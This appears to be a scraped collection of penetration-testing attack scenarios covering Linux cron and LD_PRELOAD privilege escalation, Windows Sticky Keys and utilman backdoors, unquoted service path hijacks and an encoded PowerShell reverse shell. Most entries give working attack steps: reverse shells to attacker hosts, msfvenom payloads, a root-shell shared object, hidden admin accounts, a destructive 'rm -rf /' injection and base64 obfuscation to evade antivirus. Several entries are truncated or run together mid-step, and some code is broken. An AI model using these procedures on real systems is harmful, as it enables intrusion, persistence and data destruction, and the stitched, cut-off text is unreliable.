Attack Type: Privilege Escalation via Env Variable Manipulation
Scenario Description: Many cron jobs use environment variables (e.g., PATH, SHELL, MAILTO) at the top of the crontab. If an attacker can edit a user's crontab (or trick the system into running it), they can set a malicious environment variable (like PATH) to point to a directory with a malicious binary, tricking the cron job to run their payload as root or a privileged user.
Tools Used: ✅ Kali Linux✅ Target Linux (Ubuntu or Debian)✅ crontab, nano, whoami, id, echo, chmod, mkdir
Attack Steps: ### 🟢 STEP 1: Set Up EnvironmentCreate a malicious binary:mkdir /tmp/fakebin && echo -e '#!/bin/bash\necho hacked > /tmp/pwned' > /tmp/fakebin/ls && chmod +x /tmp/fakebin/ls---### 🟢 STEP 2: Edit Crontabcrontab -eSet a malicious PATH:PATH=/tmp/fakebin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAdd a cron job:* * * * * ls---### 🟢 STEP 3: Wait One MinuteCheck:cat /tmp/pwned → should print hacked---✅ This proves the cron used your fake binary instead of system one---### 🛑 STEP 4: CleanupRemove crontab entry:crontab -e and delete linesDelete files:rm -rf /tmp/fakebin /tmp/pwned
Target Type: Linux ServersDev/Test MachinesContainers with relaxed cron security
Vulnerability: Cron using insecure or attacker-controlled environment variables
Impact: - Malicious script execution- Escalation to root (if cron runs as root)- Data overwrite or exfil
Detection Method: - Monitor cron files for unusual env variables- Check PATH integrity before job runs- Use FIM on /etc/crontab and /var/spool/cron
Solution: - Never include untrusted paths in cron environment- Set PATH to known safe defaults- Do not run critical cron jobs as root unnecessarily
Source: MITRE ATT&CK, HackTricks, Crontab Docs, Red Team Linux Guide

Title: Hijack Log or Temp File Referenced by Cron Script
Scenario Description: In this scenario, a cron job run as root references a temporary file or log file (e.g., /tmp/task.log) that is world-writable or improperly permissioned. An attacker can replace or symlink the file to a malicious script or system file (like /etc/shadow). On next cron run, the root process overwrites it or executes unintended code, leading to privilege escalation or data corruption.
Tools Used: ✅ Kali Linux (attacker)✅ Ubuntu/Parrot (target VM)✅ crontab command✅ ln, ls, chmod, nano, tail, whoami
Attack Steps: ### 🟢 STEP 1: Identify Vulnerable Cron JobCheck root’s cron jobs:sudo cat /etc/crontab or sudo crontab -lExample vulnerable entry:* * * * * root /usr/local/bin/backup.sh >> /tmp/backup.logThis script writes to a world-accessible /tmp/backup.log.---### 🟢 STEP 2: Hijack the Log FileReplace /tmp/backup.log with a symlink to a critical file:ln -s /etc/shadow /tmp/backup.logORInject a malicious command:echo 'rm -rf /' > /tmp/backup.log---### 🟢 STEP 3: Wait for Cron to TriggerWait 1–2 minutes for cron to execute. When backup.sh writes output to the log, it now overwrites /etc/shadow (denial) or triggers the payload.---### 🟢 STEP 4: Gain Privilege or Cause ImpactIf malicious code was placed, observe system behavior:whoami → now root?tail -f /etc/shadow → corrupted or empty?---### 🟢 STEP 5: Cleanup for Safety• Remove malicious links or files• Restore original cron behavior• Fix permissions on scripts and files• Document findings and submit to blue team✅ Tip: Use auditctl -w /tmp/backup.log -p wa to monitor file changes.
Vulnerability: Writable log or temp file used in root-owned cron job
Impact: - File overwrite as root- Full privilege escalation- Shadow file deletion or replacement
Detection Method: - Monitor cron job output- Use auditd or Sysmon for Linux- Detect symlink to protected files
Solution: - Use mktemp with safe perms- Never write to world-writable paths- Validate log file paths- Use logrotate with correct perms
Source: MITRE ATT&CK, GTFOBins, HackTricks, Linux Hardening Guides

Title: Create Malicious Cron Job in User Crontab
Scenario Description: In this attack, an adversary compromises a non-root user account and leverages the user's crontab to create a malicious scheduled task. The cron job ensures automatic execution of a payload, allowing the attacker to maintain persistence, re-establish access, or run arbitrary commands at specific intervals. This is a simple yet powerful method for stealthy persistence using native OS features.
Tools Used: ✅ Kali Linux (Attacker)✅ Linux VM (Victim)✅ crontab command✅ echo, nano, id, bash, netcat, or custom payload
Attack Steps: ### 🟢 STEP 1: Compromise a User Account• Assume credentials were stolen (e.g., via phishing or weak SSH password).• SSH into the target:ssh victimuser@192.168.1.10Confirm access:whoami → victimuser---### 🟢 STEP 2: Understand User Cron MechanismEach user can manage personal cron jobs using:crontab -eThese jobs are stored in /var/spool/cron/crontabs/username but should only be edited with crontab.---### 🟢 STEP 3: Create Malicious Cron EntryLaunch:crontab -eAdd the following line to execute a reverse shell every minute:* * * * * bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1Save and exit (Ctrl+O, Enter, Ctrl+X in nano).---### 🟢 STEP 4: Set Up Attacker ListenerOn attacker machine (Kali):nc -nlvp 4444When cron runs, the reverse shell connects to attacker giving full terminal of the user.---### 🟢 STEP 5: Optional – Write Output to Hidden LogTo reduce noise, redirect cron job output to a hidden file:* * * * * bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1 > /dev/null 2>&1Or use:* * * * * /home/victimuser/.payload.shWhere .payload.sh contains malicious logic (and is hidden).---### 🟢 STEP 6: Confirm PersistenceWait for a minute and confirm shell access is received.Check cron log (if enabled):grep CRON /var/log/syslog---### 🟢 STEP 7: Cleanup (Ethical Use)• Remove cron job via crontab -e• Kill reverse shell listener• Delete .payload.sh if used• Log all steps in report for blue team or training docs✅ Tip: Use this technique in isolated lab environments only. Never deploy in real infrastructure.
Vulnerability: User-level cron access without validation or integrity checking
Impact: - Persistent backdoor access- Remote shell every minute- Recon/Enum/Data Theft possibilities
Detection Method: - Monitor user crontab entries- Enable auditd to track crontab -e usage- Review /var/spool/cron/crontabs/ changes
Solution: - Disable cron for low-privilege users- Audit crontab usage- Alert on suspicious job contents- Use AppArmor/SELinux for script restrictions
Source: MITRE ATT&CK, GTFOBins, HackTricks, Linux Cron Docs

Title: Abuse World-Writable /etc/cron.d/
Scenario Description: If the directory /etc/cron.d/ is world-writable (chmod 777 or chmod o+w), attackers can place malicious job files that the cron daemon executes with root privileges. This attack exploits misconfigured file permissions, common in poorly hardened Linux systems, allowing any local user to escalate privileges or maintain stealthy persistence using native system cron features.
Tools Used: ✅ Kali Linux (Attacker)✅ Linux VM (Victim)✅ echo, nano, bash, chmod, ls, id✅ netcat or reverse shell payload
Attack Steps:
### 🟢 STEP 1: Verify World-Writable PermissionsCheck the directory:ls -ld /etc/cron.d/If output shows drwxrwxrwx or similar (rwx for others), it's misconfigured.---### 🟢 STEP 2: Prepare Malicious Cron FileCreate a cron job that runs every minute with root privileges:Example reverse shell job:bash
echo '* * * * * root bash -i >& /dev/tcp//4444 0>&1' > evilcron
Alternative: Use a local shellbash
echo '* * * * * root /bin/bash /tmp/rootme.sh' > evilcron
Make sure the script /tmp/rootme.sh is executable and does something verifiable (like creating a root-owned file or adding a new root user).---### 🟢 STEP 3: Deploy Cron FilePlace it in /etc/cron.d/:mv evilcron /etc/cron.d/evilcronSet correct permissions:chmod 644 /etc/cron.d/evilcron(Cron requires readable files, not executable.)---### 🟢 STEP 4: Start Listener (If Reverse Shell Used)On attacker box:nc -nlvp 4444Wait for cron to run (within 60 seconds). Shell should connect.---### 🟢 STEP 5: Validate Exploitation• If reverse shell: check access level → id → should be uid=0 (root)• If using a script:tail -f /tmp/root_flag.txt or check /etc/passwd for new root user---### 🟢 STEP 6: Cleanup (For Ethical Testing Only)• Remove cron file:rm /etc/cron.d/evilcron• Remove temp files or root user if added• Document timestamps and test results for analysis✅ Tip: Use isolated VMs and snapshots during practice labs. Never test on production Linux systems.
Vulnerability: Misconfigured directory permissions allowing global write access to /etc/cron.d/
MITRE Technique: T1053.005 (Scheduled Task/Job: Cron Job File in cron.d)
Impact: - Root privilege escalation- System backdoor- Arbitrary command execution as root
Detection Method: - Monitor file integrity of /etc/cron.d/- Use auditd to track file writes- Alert on new files owned by non-root users
Solution: - Restrict write permissions to /etc/cron.d/- Run chmod o-w /etc/cron.d- Implement tripwire, aide, or similar integrity checkers- Use AppArmor/SELinux to limit cron jobs
Source: MITRE ATT&CK, HackTricks, GTFOBins, Linux Security Docs

Title: Replace sethc.exe with cmd.exe (Classic)
Attack Type: Local Privilege Escalation via File Replace
Scenario Description: This simulation demonstrates how attackers exploit access to the Windows System32 directory to replace sethc.exe (Sticky Keys) with cmd.exe. Once replaced, pressing Shift key 5 times at the login screen launches a SYSTEM-level command prompt without logging in, bypassing authentication. This exploit is often used on locked systems with physical access or bootable USBs.
Tools Used: ✅ Bootable USB with Kali/WinPE✅ Access to local disk (e.g., C:\)✅ Windows machine with Sticky Keys enabled✅ cmd.exe, sethc.exe
Attack Steps: ### 🟢 STEP 1: Prepare Bootable MediaUse Rufus or BalenaEtcher to create a bootable Kali Linux or Windows PE USB.Insert into target system.---### 🟢 STEP 2: Boot into Live EnvironmentBoot from USBChoose “Try Kali” (or Live Mode)---### 🟢 STEP 3: Mount Windows PartitionFind and mount the target system partition:lsblk or fdisk -lmount /dev/sda1 /mntNavigate:cd /mnt/Windows/System32---### 🟢 STEP 4: Backup Original Sticky Keys Executablemv sethc.exe sethc_backup.exe---### 🟢 STEP 5: Replace sethc.exe with cmd.execp cmd.exe sethc.exe✅ Now, pressing Shift key 5 times at login will launch a SYSTEM cmd prompt---### 🟢 STEP 6: Reboot and Trigger ExploitReboot systemAt login screen, press Shift key 5 times rapidly→ SYSTEM command prompt (C:\Windows\System32\cmd.exe)Now you can:• Add a new admin user:net user bro123 mypass123 /addnet localgroup administrators bro123 /add• Change existing user password:net user targetuser newpass• Enable RDP:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f✅ You now have SYSTEM-level access without logging in.---### 🛑 STEP 7: Cleanup (for ethical use)• Replace sethc.exe with original:del sethc.exerename sethc_backup.exe sethc.exe• Log activity and disable Sticky Keys via registry:reg add "HKCU\Control Panel\Accessibility\StickyKeys" /v Flags /t REG_SZ /d 506 /f
Target Type: Windows 7 / 10 / 11WorkstationsDomain-joined machines with poor physical security
Vulnerability: Weak physical securitySticky Keys enabledWrite access to System32 via boot media
Impact: - Full SYSTEM-level shell without credentials- Add users- Change passwords- Enable backdoors
Detection Method: - Monitor for abnormal use of cmd.exe or sethc.exe at logon screen- Integrity check on System32 files- Audit login screen interactions
Solution: - Disable Sticky Keys from login screen- Use full disk encryption (BitLocker)- Restrict BIOS boot options- Enable UEFI password- Monitor & block bootable media
Source: MITRE ATT&CK, Microsoft Docs, HackTricks, PentestMonkey

Title: Replace Utility Manager (utilman.exe)
Attack Type: Local Privilege Escalation via File Replace
Scenario Description: This simulation demonstrates how attackers can exploit access to the Windows System32 directory to replace utilman.exe (Utility Manager) with cmd.exe. Utility Manager can be launched from the login screen via Windows + U shortcut. Once replaced, pressing this combo will trigger a SYSTEM-level command prompt, granting full access without logging in. Used in physical access or bootable USB scenarios.
Tools Used: ✅ Bootable USB (Kali, WinPE, etc.)✅ Physical access to target machine✅ Access to C:\Windows\System32✅ cmd.exe, utilman.exe
Attack Steps: ### 🟢 STEP 1: Prepare a Bootable USBUse Kali Linux, Hiren’s Boot CD, or Windows PE to create a live USB using Rufus.Boot from this USB on the target system.---### 🟢 STEP 2: Mount the Windows DriveList partitions:lsblk or fdisk -lMount primary Windows partition:mount /dev/sda1 /mntNavigate:cd /mnt/Windows/System32---### 🟢 STEP 3: Backup Original utilman.exemv utilman.exe utilman_backup.exe---### 🟢 STEP 4: Copy cmd.exe to utilman.execp cmd.exe utilman.exe✅ Now, launching Utility Manager will launch a SYSTEM cmd prompt.---### 🟢 STEP 5: Reboot and Trigger ExploitReboot the machine normally.At login screen, press Windows + U OR click the Ease of Access icon.✅ This opens a SYSTEM-level cmd.exe shell.Now you can:• Create a new user:net user admin123 MyPass123 /addnet localgroup administrators admin123 /add• Reset an existing user's password:net user victimuser newpass123• Enable RDP:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f---### 🛑 STEP 6: Restore Original Files (Post-Exploit Cleanup)Reboot into bootable USB again.Navigate to System32:• rm utilman.exe• mv utilman_backup.exe utilman.exe🧠 Tips:• This technique works across Windows 7/10/11 if secure boot protections are not enforced.• Useful for forensics students, red-team demos, or locked-out recovery.
Vulnerability: Physical access to System32Unrestricted file operationsEase of Access apps run as SYSTEM
Impact: - SYSTEM-level shell at login- Full user control- Add or reset passwords- Activate services like RDP
Detection Method: - Integrity monitoring on System32 binaries- Event log (ID 4688) for cmd.exe at login- Forensics for file modification timestamps
Solution: - Disable Ease of Access tools on login screen- Use BitLocker for full disk encryption- Enable UEFI password- Restrict boot from USB / CD-ROM
Source: MITRE ATT&CK, HackTricks, Microsoft Security Docs

Title: Replace Alternate Accessibility Binaries
Attack Type: Local Privilege Escalation via File Replacement
Scenario Description: This simulation demonstrates how attackers can escalate privileges by replacing alternate accessibility binaries (e.g., osk.exe, narrator.exe, magnify.exe) in C:\Windows\System32 with cmd.exe. These tools run with SYSTEM privileges at the login screen via Ease of Access or keyboard shortcuts. This allows full shell access without credentials — often used in red teaming or physical access post-exploitation.
Tools Used: ✅ Kali Linux or WinPE bootable USB✅ Access to victim drive✅ cmd.exe binary✅ Windows login screen access
Attack Steps: ### 🟢 STEP 1: Boot Into Live USB EnvironmentUse WinPE, Kali Linux, or any live OS to create a bootable USB using Rufus or Ventoy.Insert into victim PC and boot from it.---### 🟢 STEP 2: Mount Windows PartitionUse lsblk or diskpart to identify Windows partition (e.g., sda1, C:).Mount:mount /dev/sda1 /mnt (Linux)Or access C:\Windows\System32 (Windows PE).---### 🟢 STEP 3: Backup Target BinaryChoose one:• osk.exe → On-screen keyboard• narrator.exe → Windows Narrator• magnify.exe → Screen magnifierBackup:mv osk.exe osk_backup.exe---### 🟢 STEP 4: Replace with cmd.execp cmd.exe osk.exeDo the same for other binaries if desired.✅ Now when triggered, the shell will launch instead.---### 🟢 STEP 5: Reboot and Launch ShellReboot the system normally.At login screen, click the Ease of Access icon and select:• On-Screen Keyboard• Narrator• Magnifier✅ A SYSTEM-level cmd.exe shell will appear!Use to:• Create a new admin user:net user sysadmin Pass@123 /addnet localgroup administrators sysadmin /add• Enable RDP or reset passwords:net user target newpass123---### 🛑 STEP 6: Restore Binaries (Cleanup)Boot again via USBNavigate to C:\Windows\System32Restore backups:rm osk.exe && mv osk_backup.exe osk.exe🧠 Tip:This method works on Windows 7–11 unless Secure Boot & BitLocker are enforced.
Target Type: Windows PCsUnprotected LaptopsEnterprise workstations with weak boot policies
Vulnerability: Accessibility binaries run as SYSTEMNo file integrity protection or BitLocker
MITRE Technique: T1546.008 (Accessibility Features)T1055 (Process Injection via Binary Replacement)
Impact: - Full SYSTEM shell at login screen- Create admin users- Reset credentials- Enable RDP
Detection Method: - Detect changes to osk.exe, narrator.exe, etc.- Monitor for SYSTEM cmd.exe launch during login- Use File Integrity Monitoring (FIM) tools
Solution: - Block USB boot or password protect BIOS- Enable full disk encryption (BitLocker)- Remove Ease of Access from login screen- Monitor System32 file changes
Source: MITRE ATT&CK, HackTricks, Microsoft Docs, Red Team Notes

Title: Bypass via Live CD / Bootable USB
Scenario Description: This simulation showcases how an attacker can bypass Windows authentication entirely by booting from a Live CD or bootable USB (e.g., Kali Linux, WinPE) and accessing the NTFS partition of the system. From there, the attacker can reset local passwords, extract sensitive files (like SAM hashes), or replace system binaries (like cmd.exe, utilman.exe, sethc.exe). This is extremely effective where BitLocker or BIOS-level protections are not enforced.
Tools Used: ✅ Kali Linux or Ubuntu Live CD✅ Bootable USB (Rufus/Ventoy)✅ chntpw (Offline NT Password Editor)✅ ntpasswd (optional)✅ lsblk, mount, regedit
Attack Steps:
### 🟢 STEP 1: Create Bootable USB• Download Kali or Ubuntu ISO• Use Rufus to flash ISO to USB---### 🟢 STEP 2: Boot Target System• Plug in the USB• Enter BIOS/UEFI (usually DEL, F2, or ESC during boot)• Change boot order to USB first• Boot into Live Linux session---### 🟢 STEP 3: Mount Windows Partition• Open terminal• Run lsblk to locate NTFS partition (e.g., /dev/sda3)• Create mount point: mkdir /mnt/windows• Mount: mount /dev/sda3 /mnt/windows✅ Now you can access C:\Windows\System32---### 🟢 STEP 4A: Reset Admin Password• Go to Windows/System32/config• Use chntpw:bash
chntpw -i SAM
→ Select admin user→ Clear password→ Save changes---### 🟢 STEP 4B: Add Admin User (Alternative)• Use regedit or modify cmd.exe to run on login• Backup utilman.exe:mv utilman.exe utilman.bak• Replace with cmd:cp cmd.exe utilman.exe✅ Now pressing Windows + U at login gives SYSTEM shell---### 🟢 STEP 5: Reboot and Access• Remove USB• Boot into Windows• Press Windows + U at login• SYSTEM shell opens:net user hacker Pass@123 /addnet localgroup administrators hacker /add✅ Privilege escalation complete without credentials.---### 🛑 STEP 6: Cleanup (if ethical test)• Restore utilman.exe• Remove temp users• Reset passwords appropriately
Vulnerability: - No BIOS password- No USB boot restrictions- No disk encryption- Writable filesystem
MITRE Technique: T1546.008 (Accessibility Feature Abuse)T1556.001 (Credential Manipulation)T1200 (Boot or Logon Autostart Execution)
Impact: - Full SYSTEM-level access- Local password reset- User creation- Credential theft- Offline data exfiltration
Detection Method: - Monitor boot logs- Look for unexpected password resets- Check registry audit trails- Use forensic analysis tools
Solution: - Enforce BIOS password- Disable USB boot- Enable full disk encryption (BitLocker)- Monitor registry and login changes- Use tamper-proof endpoint controls
Source: MITRE ATT&CK, Red Team Notes, HackTricks, Kali Docs

Title: Sticky Keys RDP Bypass (Remote)
Scenario Description: This scenario shows how attackers who have RDP access to a Windows machine (often with limited or guest credentials) can gain SYSTEM-level access by triggering the sticky keys backdoor (sethc.exe). If cmd.exe has previously been swapped in place of sethc.exe, even low-privileged RDP users can spawn a SYSTEM shell at the login screen without physical access. Commonly abused in persistent or multi-session environments, such as corporate RDP servers, jump boxes, or VMs.
Tools Used: ✅ RDP client (mstsc or xfreerdp)✅ Prior access to swap sethc.exe✅ Administrator (initial backdoor placement)✅ Command Prompt✅ Metasploit (optional)✅ Remote File Transfer Tool (e.g., smbclient, WinSCP)
Attack Steps:
### 🟢 PART 1: Precondition – Setup Sticky Keys Backdoor (One-time)⚠️ Must be done by an attacker/admin with write access to C:\Windows\System321. Gain SYSTEM shell (via LPE, bootable USB, or admin shell)2. Backup sticky keys binary:cmd
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.bak
3. Replace it with cmd:cmd
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
✅ Now pressing Shift 5 times at login screen spawns a SYSTEM shell.---### 🟢 PART 2: Remote Abuse via RDP1. Connect via RDP to the victim system (RDP enabled)• Use mstsc.exe on Windows• Use xfreerdp on Linux:bash
xfreerdp /u:user /p:pass /v:
2. Wait for login screen3. Press Shift key 5 times✅ A SYSTEM-level cmd.exe appears over login screen!---### 🟢 PART 3: Create Admin User from SYSTEM Shellcmd
net user hacker Pass@123 /add
net localgroup administrators hacker /add
✅ You can now login fully or RDP with admin.---### 🛑 STEP 4: Cleanup (Ethical Use Only)1. Restore original sethc.exe:cmd
copy /y C:\Windows\System32\sethc.bak C:\Windows\System32\sethc.exe
2. Delete backdoor usercmd

Title: Run Known Exploitable SUID Binary with Shell Spawn
Scenario Description: This simulation shows how attackers can exploit known vulnerable SUID binaries (e.g., vim, less, find, cp, etc. with SUID bit set) to gain root access. The attacker, starting as a limited user, finds these binaries using find or linpeas, and uses known abuse techniques from GTFOBins to escalate privileges by spawning a root shell (/bin/sh or /bin/bash). Very common in misconfigured or old Linux systems.

Title: Write Custom SUID C Shell Binary
Scenario Description: This simulation demonstrates how an attacker or insider with write access to a directory or permission to execute a compiled binary with root ownership and SUID set, can compile a malicious C binary that spawns a shell (/bin/bash). Title: LD_PRELOAD or LD_LIBRARY_PATH Injection
Attack Type: Local Privilege Escalation via Shared Object Injection
Scenario Description: This simulation showcases how a local attacker can abuse environment variables like LD_PRELOAD or LD_LIBRARY_PATH to load a malicious shared object (.so) before the target binary loads its real library. If the binary is not protected (e.g., not setuid-root or lacks sanitization), attackers can escalate privileges or hijack execution, especially in scripts or misconfigured cron jobs.
Tools Used: ✅ Linux VM (Kali, Ubuntu)✅ GCC compiler✅ Text editor (nano, vim)✅ Any misconfigured binary or custom script
Attack Steps:
### 🟢 STEP 1: Understand LD_PRELOAD BasicsLD_PRELOAD forces a specified .so (shared object) to be loaded before system libraries.Example:bash
LD_PRELOAD=./malicious.so ls
This runs the ls command but first loads malicious.so.---### 🟢 STEP 2: Identify Vulnerable TargetTarget should:• Be dynamically linked (not statically)• Not strip or ignore environment varsCheck:bash
ldd /usr/bin/somebinary
If it shows linked libraries, it’s dynamic.Use strings, strace, or inspect shell scripts or cron jobs to find a target using relative or unsafe library paths.---### 🟢 STEP 3: Create Malicious Shared LibraryWrite a .c file that hijacks a function:c
#include
void __attribute__((constructor)) init() {
setuid(0); setgid(0);
system("/bin/bash");
}
Compile it:bash
gcc -fPIC -shared -o malicious.so malicious.c
---### 🟢 STEP 4: Trigger the Vulnerable BinaryIf binary does not strip LD_PRELOAD, run:bash
LD_PRELOAD=./malicious.so /path/to/vuln-bin
You should now have a root shell if binary is setuid.✅ Confirm:bash
id
whoami
If you see uid=0(root), it worked.---### 🛑 STEP 5: Cleanupbash
exit

history -c
🧠 Tip:• This also works with LD_LIBRARY_PATH if you create a directory with a fake .so name like libc.so.6 and preload it before execution.

Detection Method: - Monitor use of LD_PRELOAD- Detect shared object injection with auditd, ps, or custom watchdogs

Title: PATH Variable Manipulation (Unsafe System Calls)

Scenario Description: This simulation explores how an attacker can exploit a poorly written script or binary that uses relative system calls (e.g., system("cp file /tmp/")) without full paths. If the script runs with elevated privileges and the attacker can manipulate $PATH, they can replace the called command (e.g., cp) with a malicious version that spawns a root shell. This is a common misconfiguration in custom scripts and backup utilities.

### 🟢 STEP 1: Identify Vulnerable Script or BinaryLook for a file that:• Runs with sudo, cron, or SUID• Uses system() or shell commands without full pathsExample vulnerable code:bash

echo -e '#!/bin/bash\n/bin/bash' > /tmp/cp
chmod +x /tmp/cp

Title: Exploit Custom SUID Binary via Buffer Overflow / File Overwrite
Scenario Description: A custom SUID binary written in C is installed with root ownership and SUID permission. Title: Drop Malicious EXE at C:\Program.exe
Scenario Description: When Windows services or scheduled tasks use unquoted paths with spaces (e.g., "C:\Program Files\Example Service\service.exe"), Windows will look for the first matching executable in the split path (e.g., C:\Program.exe, C:\Program Files\Example.exe). An attacker with low privilege and write access to C:\ can drop a malicious executable named Program.exe, which runs with SYSTEM privileges when the service starts. Common on misconfigured Windows systems.
Tools Used: ✅ Windows 10 VM✅ CMD or PowerShell✅ Metasploit (optional)✅ accesschk.exe from Sysinternals✅ Service list viewer (services.msc)
Attack Steps: ### 🔹 STEP 1: Find Vulnerable Service• Run: wmic service get name,displayname,pathname,startmode• Look for unquoted paths with spaces:Example: "C:\Program Files\Vulnerable Service\svc.exe"• Confirm if StartMode is Auto or Manual### 🔹 STEP 2: Check Write Access• Use Sysinternals:accesschk.exe -uwd "Users" C:\• If "WRITE" or "FILE_ADD_FILE" on C:\, you're vulnerable.### 🔹 STEP 3: Create Malicious Payload• Generate payload:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o Program.exe• Or simply: a messagebox or UAC bypass payload### 🔹 STEP 4: Drop Executable• Copy to root:move Program.exe C:\Program.exe### 🔹 STEP 5: Restart the Vulnerable Service• From low-priv user:net stop "Vulnerable Service"net start "Vulnerable Service"→ SYSTEM service starts and launches C:\Program.exe### 🔹 STEP 6: Catch Shell (if used Metasploit payload)• Start handler:msfconsoleuse exploit/multi/handlerset PAYLOAD windows/x64/shell_reverse_tcpset LHOST <your_ip>set LPORT 4444run### 🔹 STEP 7: Post-Exploitation• Run whoami → returns nt authority\system• Cleanup:– Delete C:\Program.exe– Log events for forensic analysis🧠 Tips:• This attack doesn’t require admin access—just write permissions to root• Many old enterprise systems still vulnerable• Check via: sc qc "<service>" for unquoted path
Vulnerability: Unquoted service path with spacesWritable C:\ drive for low-priv user
Impact: Full SYSTEM-level code executionReverse shellPersistence setup
Detection Method: - Event logs: 7045 (Service install), 4697 (Service start)- Use Sysmon to monitor unexpected EXE in C:\
Solution: - Always quote paths in Windows service configs- Remove write permissions from C:\ for Users- Use GPO to enforce restricted paths
Source: GTFOBins, HackTricks, Pentestmonkey, Windows Internals, FireEye reports

Title: Drop Malicious EXE at C:\Program Files\Some.exe
Scenario Description: Similar to the C:\Program.exe attack, this technique targets unquoted Windows service paths with intermediate folders having spaces. Title: Writable Directory Within Path
Scenario Description: In this technique, attackers exploit a writable directory that appears in the system %PATH% environment variable. When a privileged process or user runs a command without specifying a full path, Windows will search each directory in %PATH% for that binary. If a lower-privileged user can drop a malicious EXE (e.g., net.exe, whoami.exe) in one of these writable directories, and the process prioritizes it, the attacker’s binary is executed with higher privileges (e.g., SYSTEM).
Tools Used: ✅ Windows VM (Win7/10)✅ whoami, set, echo, accesschk✅ CMD or PowerShell✅ Optional: msfvenom, procmon
Attack Steps:
🔹 STEP 1: View System PATH• Open cmd prompt:echo %PATH%• Look for directories like C:\Tools\, C:\Temp\, etc.🔹 STEP 2: Check Permissions• Use Sysinternals:accesschk.exe -uwd "Users" C:\Tools• Or right-click folder → Properties → Security → Users: "Modify" or "Write"🔹 STEP 3: Identify Vulnerable Executable Names• Review common commands executed by privileged scripts/services:whoami, hostname, net, tasklist• Also check scheduled tasks, login scripts, or service configs🔹 STEP 4: Create Malicious Payload• Build malicious whoami.exe that runs cmd.exe or creates a reverse shellExample:msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 -f exe -o whoami.exe🔹 STEP 5: Drop Payload in Writable PATH Directorycopy whoami.exe C:\Tools\whoami.exe🔹 STEP 6: Trigger Execution• Wait for service/script that calls whoami (or trigger manually if allowed)• Or create scheduled task using SYSTEM that runs without full path:cmd
schtasks /Create /SC ONCE /TN "Pwn" /TR "whoami" /ST 12:00 /RU SYSTEM
→ If successful, C:\Tools\whoami.exe runs as SYSTEM🔹 STEP 7: Gain Shell / Proof• If reverse shell used: catch on Metasploit• If interactive shell: whoami should show nt authority\system🔹 STEP 8: Cleanup• Delete whoami.exe or other dropped binaries• Check event logs for trace• Restore integrity of affected PATH folders🧠 Tips:• Works even with UAC if elevated process uses unquoted/bare command names• PATH order matters: first match wins• This attack is stealthier than dropping to C:\Program.exe
Vulnerability: Writable PATH directoryCommand execution without full binary pathNo integrity checking
Impact: Full SYSTEM privilegeReverse shell or local adminCode execution during service/scheduled task/script runs
Detection Method: • Enable audit logging• Monitor %PATH% environment• Use Sysmon or EDR to detect rogue binaries• Review folder-level permissions regularly
Solution: • Never include user-writable directories in %PATH%• Use full paths in scripts and configs• Lock down folder ACLs in %PATH%• Use AppLocker or allowlists
Source: GTFOBins, HackTricks, RedTeamNotes, Local Windows Lab

Title: Path Injection via Space in Custom Service Paths

Scenario Description: This attack abuses custom Windows services registered with unquoted executable paths containing spaces (e.g., "C:\Apps\My Service\App.exe"). C:\Apps\My.exe ← Executed if present2. C:\Apps\My Service\App.exe🔹 STEP 3: Check Directory Permissions• Run:accesschk.exe -uwd "Users" C:\Apps• If "WRITE" or "FILE_ADD_FILE" is present → vulnerable🔹 STEP 4: Build Malicious EXE• Use:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o My.exe• OR make a simple cmd.exe launcher🔹 STEP 5: Drop Payload in Injected Pathmove My.exe C:\Apps\My.exe🔹 STEP 6: Restart the Vulnerable Servicenet stop "<Service Name>"net start "<Service Name>"• My.exe is executed with SYSTEM privileges instead of real service binary🔹 STEP 7: Confirm Execution• If reverse shell: launch handler in Metasploit• If test EXE: check if launched with whoami = nt authority\system🔹 STEP 8: Cleanup• Delete C:\Apps\My.exe• Reconfigure the service with quotes:sc config "<Service Name>" binPath= "\"C:\Apps\My Service\App.exe\""🧠 Tips:• Works even when the real binary is valid• Most common in custom or legacy services• This differs from C:\Program.exe attack — focuses on deep paths with multiple words• Test safely in isolated VMs

Title: Reverse Shell via Encoded PowerShell Payload
Scenario Description: This simulation demonstrates how an attacker can leverage built-in Windows tools like powershell.exe to establish a reverse shell using an encoded command. Encoding allows the payload to bypass simple input filters and AV detections. This is often used in phishing payloads, web shell post-exploitation, and lateral movement in enterprise Windows environments.

Attack Steps: 🟢 STEP 1: Set Up Listener on Attacker Machine  On Kali Linux (or Parrot OS), open a terminal and run the following command to start a Netcat listener that will catch the reverse shell from the target Windows system:  nc -nlvp 4444  This listens on local port 4444, waiting for incoming TCP connections.🟢 STEP 2: Prepare the PowerShell Reverse Shell Command  Write a simple PowerShell reverse shell that connects back to your attacker machine:  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback +'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"  🟢 STEP 3: Base64 Encode the Command  To obfuscate and avoid detection, encode the command using PowerShell on your Linux machine (or any Base64 tool):  echo "<the full command above>" | iconv -t UTF-16LE | base64 -w 0  Copy the encoded output for the next step.🟢 STEP 4: Build the Encoded PowerShell Launcher  Now construct a PowerShell payload using the `-EncodedCommand` flag:  powershell -NoP -NonI -W Hidden -EncodedCommand <base64_encoded_string_here>  This bypasses execution restrictions and hides the window. 🟢 STEP 5: Execute on Victim System  You can run this command via CMD prompt, infected Office macro, malicious LNK file, or other delivery mechanisms:  cmd.exe /c powershell -NoP -NonI -W Hidden -EncodedCommand <base64_encoded_string>  Once executed, this opens a reverse shell back to your Kali box. 🟢 STEP 6: Verify Shell on Kali  If 